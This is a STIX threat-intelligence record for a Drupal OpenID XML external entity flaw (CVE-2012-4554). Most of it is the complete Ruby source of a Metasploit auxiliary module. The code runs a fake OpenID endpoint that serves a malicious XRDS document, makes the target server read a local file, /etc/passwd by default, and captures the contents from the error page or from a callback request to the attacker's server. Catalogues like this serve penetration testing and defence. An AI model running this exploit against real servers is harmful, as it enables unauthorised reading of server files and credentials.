{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b08fce8d-53cd-4033-999a-8fb597679969",
    "created": "2024-08-14T16:32:37.37383Z",
    "modified": "2024-08-14T16:32:37.373833Z",
    "name": "Drupal OpenID External Entity Injection",
    "description": " This module abuses an XML External Entity Injection vulnerability on the OpenID module from Drupal. The vulnerability exists in the parsing of a malformed XRDS file coming from a malicious OpenID endpoint. This module has been tested successfully on Drupal 7.15 and 7.2 with the OpenID module enabled.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/drupal_openid_xxe.rb",
            "external_id": "drupal_openid_xxe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4554"
        },
        {
            "source_name": "reference",
            "url": "https://drupal.org/node/1815912"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/drupal/drupal/commit/b9127101ffeca819e74a03fa9f5a48d026c562e5"
        },
        {
            "source_name": "reference",
            "url": "https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution"
        },
        {
            "source_name": "#Betterresults",
            "external_id": "becausethereisntURLencoding"
        },
        {
            "source_name": "#ContentsareprobablyURLencoded",
            "external_id": "plusprobablylong"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Drupal OpenID External Entity Injection',\n      'Description'    => %q{\n        This module abuses an XML External Entity Injection\n        vulnerability on the OpenID module from Drupal. The vulnerability exists\n        in the parsing of a malformed XRDS file coming from a malicious OpenID\n        endpoint. This module has been tested successfully on Drupal 7.15 and\n        7.2 with the OpenID module enabled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Reginaldo Silva', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4554' ],\n          [ 'OSVDB', '86429' ],\n          [ 'BID', '56103' ],\n          [ 'URL', 'https://drupal.org/node/1815912' ],\n          [ 'URL', 'https://github.com/drupal/drupal/commit/b9127101ffeca819e74a03fa9f5a48d026c562e5' ],\n          [ 'URL', 'https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution' ]\n        ],\n      'DisclosureDate' => '2012-10-17'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base Drupal directory path\", '/drupal']),\n        OptString.new('FILEPATH', [true, \"The filepath to read on the server\", \"/etc/passwd\"])\n      ])\n\n  end\n\n  def xrds_file\n    element_entity = <<-EOF\n<!ELEMENT URI ANY>\n<!ENTITY xxe SYSTEM \"file://#{datastore['FILEPATH']}\">\n    EOF\n\n    xml = Document.new\n\n    xml.add(DocType.new('foo', \"[ #{element_entity} ]\"))\n\n    xml.add_element(\n      \"xrds:XRDS\",\n      {\n        'xmlns:xrds'    => \"xri://$xrds\",\n        'xmlns'         => \"xri://$xrd*($v*2.0)\",\n        'xmlns:openid' => \"http://openid.net/xmlns/1.0\",\n      })\n\n    xrd = xml.root.add_element(\"XRD\")\n\n    xrd.add_element(\n      \"Status\",\n      {\n        \"cid\" => \"verified\"\n      }\n    )\n    provider = xrd.add_element(\"ProviderID\")\n    provider.text = \"xri://@\"\n\n    canonical = xrd.add_element(\"CanonicalID\")\n    canonical.text = \"http://example.com/user\"\n\n    service = xrd.add_element(\"Service\")\n\n    type_one = service.add_element(\"Type\")\n    type_one.text = \"http://specs.openid.net/auth/2.0/signon\"\n\n    type_two = service.add_element(\"Type\")\n    type_two.text = \"http://openid.net/srv/ax/1.0\"\n\n    uri = service.add_element(\"URI\")\n    uri.text = \"METASPLOIT\"\n\n    local_id = service.add_element(\"LocalID\")\n    local_id.text = \"http://example.com/xrds\"\n\n    return xml.to_s.gsub(/METASPLOIT/, \"#{get_uri}/#{@prefix}/&xxe;/#{@suffix}\") # To avoid html encoding\n  end\n\n  def check\n    signature = Rex::Text.rand_text_alpha(5 + rand(5))\n    res = send_openid_auth(signature)\n\n    unless res\n      vprint_status(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if drupal_with_openid?(res, signature)\n      return Exploit::CheckCode::Detected\n    end\n\n    if generated_with_drupal?(res)\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def run\n    @prefix = Rex::Text.rand_text_alpha(4 + rand(4))\n    @suffix = Rex::Text.rand_text_alpha(4 + rand(4))\n    exploit\n  end\n\n  def primer\n    res = send_openid_auth(get_uri)\n\n    if res.nil?\n      # nothing to do here...\n      service.stop\n      return\n    end\n\n    unless res.code == 500\n      print_warning(\"Unexpected answer, trying to parse anyway...\")\n    end\n\n    error_loot = parse_loot(res.body)\n\n    # Check if file was retrieved on the drupal answer\n    # Better results, because there isn't URL encoding,\n    # plus probably allows to retrieve longer files.\n    print_status(\"Searching loot on the Drupal answer...\")\n    unless loot?(error_loot)\n      # Check if file was leaked to the fake OpenID endpoint\n      # Contents are probably URL encoded, plus probably long\n      # files aren't full, but something is something :-)\n      print_status(\"Searching loot on HTTP query...\")\n      loot?(@http_loot)\n    end\n\n    # stop the service so the auxiliary module ends\n    service.stop\n  end\n\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /#{@prefix}/\n      vprint_status(\"Signature found, parsing file...\")\n      @http_loot = parse_loot(request.uri)\n      return\n    end\n\n    print_status(\"Sending XRDS...\")\n    send_response_html(cli, xrds_file, { 'Content-Type' => 'application/xrds+xml' })\n  end\n\n  def send_openid_auth(identifier)\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.to_s, \"/\"),\n      'method' => 'POST',\n      'vars_get' => {\n        \"q\" => \"node\",\n        \"destination\" => \"node\"\n      },\n      'vars_post' => {\n        \"openid_identifier\" => identifier,\n        \"name\" => \"\",\n        \"pass\" => \"\",\n        \"form_id\" => \"user_login_block\",\n        \"op\" => \"Log in\"\n      }\n    })\n\n    return res\n  end\n\n  def store(data)\n    path = store_loot(\"drupal.file\", \"text/plain\", rhost, data, datastore['FILEPATH'])\n    print_good(\"File found and saved to path: #{path}\")\n  end\n\n  def parse_loot(data)\n    return nil if data.blank?\n\n    # Full file found\n    if data =~ /#{@prefix}\\/(.*)\\/#{@suffix}/m\n      return $1\n    end\n\n    # Partial file found\n    if data =~ /#{@prefix}\\/(.*)/m\n      return $1\n    end\n\n    return nil\n  end\n\n  def loot?(data)\n    return false if data.blank?\n    store(data)\n    return true\n  end\n\n  def drupal_with_openid?(http_response, signature)\n    return false if http_response.blank?\n    return false unless http_response.code == 200\n    return false unless http_response.body =~ /openid_identifier.*#{signature}/\n    return true\n  end\n\n  def generated_with_drupal?(http_response)\n    return false if http_response.blank?\n    return true if http_response.headers['X-Generator'] and http_response.headers['X-Generator'] =~ /Drupal/\n    return true if http_response.body and http_response.body.to_s =~ /meta.*Generator.*Drupal/\n    return false\n  end\n\n\nend\n\n",
    "x_mitre_disclosure_date": "2012-10-17"
}